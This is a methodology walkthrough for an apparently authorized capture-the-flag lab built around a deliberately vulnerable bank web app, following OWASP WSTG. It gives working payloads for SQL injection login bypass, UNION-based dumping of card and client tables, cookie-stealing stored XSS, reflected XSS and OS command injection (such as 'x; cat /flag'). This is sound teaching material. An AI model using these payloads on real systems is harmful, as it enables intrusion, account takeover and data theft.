# Danubius Bank — tester's methodology walkthrough

> **Authorized training target.** This guide teaches *how a tester actually finds
> and confirms* each flaw — the reasoning, not just the payload. It follows the
> **OWASP Web Security Testing Guide (WSTG)** loop. For quick payloads and the
> automated checks see [WALKTHROUGH.md](WALKTHROUGH.md); for setup/access (gate,
> login) see its "Start and access" section. Flags are demo values (`RPC{...}`).

## The method (applied to every task)

Real testing is a loop, not a lookup:

1. **Recon & map** (WSTG-INFO) — walk the app, list every input that reaches the
   backend, note what each feature *probably does* server-side.
2. **Hypothesize** — from the feature, guess the sink (a DB query? a shell? HTML
   output?) and the vuln class it invites.
3. **Baseline** — send normal input, record the normal response. You can only
   spot an anomaly against a known-good baseline.
4. **Probe** — send *one* crafted metacharacter/payload at a time and watch what
   changes (status, error text, timing, reflected content).
5. **Analyze & reason** — what does the change prove about the backend?
6. **Confirm** — a deterministic test that removes doubt (error-based, boolean,
   out-of-band callback…).
7. **Exploit** — build the minimal payload that turns the confirmed flaw into
   impact.
8. **Assess impact** — what an attacker actually gains.

**Tooling.** A browser for feel; **Burp Suite** (or ZAP) as the intercepting
proxy to see/modify every request and replay in Repeater; `curl` for scripting.
Route the app through Burp so you can inspect raw requests and responses.

Each task below is tagged with its **WSTG** reference and **OWASP Top-10**
category, and ends with a **graduated hint ladder** (H1→H3) you can lift straight
into CTFd.

---

# Week 1 — the web application

Prerequisite: get past the access gate (a player login that fronts the whole lab)
— see WALKTHROUGH.md. Everything below is the *bank* app behind it.

## W1-01 — Authentication bypass via SQL injection
`WSTG-ATHN-04` / `WSTG-INPV-05` · OWASP **A03: Injection** · surface: `POST /login`

**1. Recon & map.** The login form takes `username` + `password`. Almost every
login runs a database lookup of the shape `SELECT ... WHERE username = ? AND
password = ?`. Two things to test here: can I *inject* into that query
(WSTG-INPV-05), and can I *bypass the auth logic* (WSTG-ATHN-04)?

**2. Baseline.** Submit an obviously-wrong pair (`test` / `test`). Response:
*"Invalid credentials."* Good — that is the normal "no match" behaviour.

**3. Probe.** Put a single quote in the username: `username = '`. A quote is the
character that ends a string literal in SQL, so if the input isn't parameterized
it will break the query.

| Input (username) | Observed | Inference |
|---|---|---|
| `test` | "Invalid credentials." | normal no-match |
| `'` | **server error** showing `unterminated ... string literal … WHERE username = ''' AND password = 'x'` | the quote reached the SQL parser → **not parameterized** → injectable, and the error leaks the query shape |

**4. Reason.** The leaked query is
`… WHERE username = '<input>' AND password = '<input>'`. My username sits inside
`'...'`, ANDed with the password check. To log in without a password I need the
`WHERE` to be **true regardless of the password** — so I close the username
string, add an always-true condition, and comment out the rest of the line.

**5. Confirm & exploit.** `username = ' OR '1'='1'-- ` (any password). The query
becomes:
```
SELECT id FROM clients WHERE username = '' OR '1'='1'-- ' AND password = '…'
```
`'1'='1'` is always true and `-- ` comments the password check → the query
returns the **first** row (client id 1) and you are logged in. Want a *specific*
account instead? `username = admin'-- ` logs in as `admin`.

**6. Impact.** Full authentication bypass — sign in as any user, including admin,
with no password. It is also your foothold for reading data (W1-02).

**Flag.** On the dashboard of the account the bypass lands on (client 1).

**Hints.** H1: the login queries a database — what if the username contains a
character that's special in SQL? · H2: a single `'` makes it error and even
prints the query; your input is inside `'…'`. · H3: comment out the password
check with `' OR '1'='1'-- `.

## W1-02 — UNION-based SQL injection (data exfiltration)
`WSTG-INPV-05` · OWASP **A03: Injection** · surface: `GET /transactions?q=` (behind login)

**1. Recon & map.** The transaction search filters by counterparty and prints the
matches in a **table**. A search that queries the DB *and reflects rows on the
page* is the ideal UNION-injection target: if injectable, you can append your own
`SELECT` and read its output straight from the table.

**2. Baseline.** Search a real term (e.g. `Tesco`) → matching rows. Note the
columns rendered: **Counterparty, Amount, Note, Direction** — 4 columns.

**3. Probe.** `q = '` → **`syntax error at or near …`** → injectable (the term is
inside a string literal, likely `… ILIKE '%<q>%'`).

**4. Find the column count** (a UNION must match the number of columns). Increase
`N` in `ORDER BY N` until it breaks:

| `q` | Observed | Inference |
|---|---|---|
| `' ORDER BY 4-- ` | 200, rows | ≥ 4 columns |
| `' ORDER BY 5-- ` | error | < 5 columns → **exactly 4** |

(You could also just count the 4 columns in the table — but `ORDER BY` is the
technique that works even when the layout is unknown.)

**5. Reason & exploit.** Four columns, all rendered as text. Close the string,
`UNION SELECT` four text columns from the target table, and comment out the
trailing `%'`:
```
' UNION SELECT card_number, expiry, card_holder, status FROM cards-- 
```
The card rows now appear in the transactions table; the VIP card number is the
flag. To *discover* what to steal first, enumerate with the same trick:
```
' UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables-- 
' UNION SELECT username, id::text, full_name, role FROM clients-- 
```

**6. Impact.** Read **any** table/column in the database (cards, clients, …) —
full database disclosure.

**Flag.** The VIP card number leaked from `cards`.

**Hints.** H1: the search prints DB rows in a table — what if you could append
your *own* rows? · H2: confirm with `'`, then find the column count with
`ORDER BY N`. · H3: `' UNION SELECT card_number,expiry,card_holder,status FROM cards-- ` (4 columns).

## W1-03 — Stored (blind) XSS → admin session theft
`WSTG-INPV-02` · OWASP **A03: Injection (XSS)** · surface: `/transfer` *Note* field

**1. Recon & map.** The transfer form has a free-text **note**, and there's a
**"Report to admin for review"** action. That second part is the tell: a *more
privileged* user (the admin) will later **view your note**. Stored input rendered
to another user is the classic **stored XSS** target — and because *you* never see
the admin's screen, this is a **blind / second-order** case.

**2. Hypothesize.** If the admin's view renders the note **without output
encoding**, any JavaScript you store runs in the *admin's* browser, in the
admin's session — so you can steal the admin's cookie. You do **not** have (or
need) admin access; you make the admin's browser act for you. That is the entire
point: an attacker who *could* just log in as admin wouldn't need this — here you
can't, so you hijack the admin instead.

**3. Test out-of-band.** Blind XSS gives no feedback in your own page, so you make
the payload **call back** to a listener you control (in the real world: your
server or Burp Collaborator; here the lab provides `/w1-03/collect/<token>`).
Pick a token, store a callback in the note, submit, then **Report to admin**:
```html
<script>fetch('/w1-03/collect/MYTOKEN?c='+document.cookie)</script>
```

**4. Confirm.** Read your collector at `/w1-03/collect/MYTOKEN` (or via
`/collector`). If a hit arrives carrying a `session=…` cookie, your script
executed in the admin's browser → **stored XSS confirmed**. (If the note were
properly escaped, nothing would ever call back.)

**5. Reason about the trigger.** "Report to admin" is what makes the victim render
your note. Here the admin is an **emulated bot**: server-side it renders the note
exactly as the admin page does and "runs" anything sitting in an unescaped
`<script>`/`on…=` — no headless browser needed, and it scales to many players at
once, each isolated by their own token.

**6. Impact.** Session hijacking of a privileged user → admin account takeover.
The stolen cookie carries `FLAG_W1-03`.

**Hints.** H1: who *else* reads your transfer note, and is it escaped? · H2: you
won't see the result yourself — make the payload phone home to a collector you
control, then Report to admin. · H3:
`<script>fetch('/w1-03/collect/<token>?c='+document.cookie)</script>`, Report,
then read `/w1-03/collect/<token>`.

## W1-04 — Reflected XSS (with proof-of-execution)
`WSTG-INPV-01` · OWASP **A03: Injection (XSS)** · surface: `GET /search?q=` (behind login)

**1. Recon & map.** `/search` echoes your query back on the page ("Results
for: *…*"). Input reflected into the response is the **reflected XSS** candidate.
Unlike W1-03 there's no second user — in this single-player task **you are the
victim**: your payload runs in *your* authenticated browser (exactly as a real
reflected-XSS link would run in a victim you phished).

**2. Baseline → probe.** Search `hello` → the page prints `hello`. Now escalate
one step at a time:

| `q` | Observed | Inference |
|---|---|---|
| `hello` | prints `hello` | reflected |
| `<b>hi</b>` | renders **bold** (not literal) | reflected **into HTML unescaped** |
| `<img src=x onerror=alert(1)>` | `alert` fires | arbitrary **JS executes** |

**3. Discover the proof mechanism** (this is the part people miss — *how* do you
even know about `window.__proof`?). Landing an `alert` is nice, but the flag
isn't just handed over; the app wants *proof your script ran in the page*. Recon
reveals how:

- **Read the client side.** View source (Ctrl+U) or the DevTools console on
  `/search`. You'll find an injected `<script>window.__proof="e3f1…"</script>`
  (with a comment noting its role). Type `window.__proof` in the console — it
  prints the value, proving any script on the page (including yours) can read it.
- **Reload the page** — the value **changes every time**. A random token,
  regenerated per load and parked on a global, is a verification / anti-cheat
  token: something a "solved" state must present.
- **Where to present it** is the challenge objective (stated in the CTFd brief):
  `/search/solved`. Probe it — a bare `GET /search/solved` → **403** — which
  confirms it won't release the flag *without* that page-bound token.

So you can't `curl` the flag: your **injected JS must read `window.__proof` and
send it** to the solve endpoint. That's what makes it a genuine XSS proof and not
a guessed request.

**4. Exploit.** Inject JS that reads the nonce from the page and calls the solve
endpoint:
```html
<img src=x onerror="fetch('/search/solved?n='+window.__proof)">
```
After it runs, reload `/search` → `FLAG_W1-04`.

**5. Impact.** Arbitrary JavaScript in a victim's authenticated session — cookie
theft, actions on their behalf — delivered by a crafted URL.

**Hints.** H1: the page echoes your search term — is it HTML-encoded? · H2: `<b>`
renders, so inject script; but the flag needs proof it ran (see `window.__proof`).
· H3: `<img src=x onerror="fetch('/search/solved?n='+window.__proof)">`.

## W1-05 — OS command injection
`WSTG-INPV-12` · OWASP **A03: Injection** · surface: `/export` *File name* field

**1. Recon & map.** The statement-export feature takes a **file name**. Features
that build files, convert, ping, or "export" often **shell out** to a system
command — a command-injection candidate (WSTG-INPV-12).

**2. Baseline.** Export a normal name, `statement`. The output echoes something
like:
```
Preparing PDF statement export …
ls -la /srv/exports/statement
```
That's a gift: the app shows the **actual shell command**, with your input
appended to it. The sink is a shell string.

**3. Probe.** If it's a raw shell string, a command separator lets me run a second
command. Append `; id`:

| File name | Observed | Inference |
|---|---|---|
| `statement` | `ls -la /srv/exports/statement` | input concatenated into a shell command |
| `x; id` | `uid=0(root) gid=0(root) …` | a **second command ran** → command injection |

Other separators to know: `&&`, `\|`, `` $(…) ``, backticks.

**4. Exploit.** Read the secret the export host holds:
```
x; cat /flag
```

**5. Impact.** Arbitrary command execution on the export host. By design that host
is an **isolated, network-less, capability-dropped container** holding only
`FLAG_W1-05`, so the blast radius is contained — but the technique is full RCE.

**Hints.** H1: the export echoes a shell command containing your file name. · H2:
chain your own command with `;`, `&&`, or `|` — try `; id`. · H3: `x; cat /flag`.

---

*Weeks 2–4 (REST API access-control, the LLM assistant, and the blue-team
investigation) follow in the same methodology style — to be added once the depth
and format above are confirmed.*
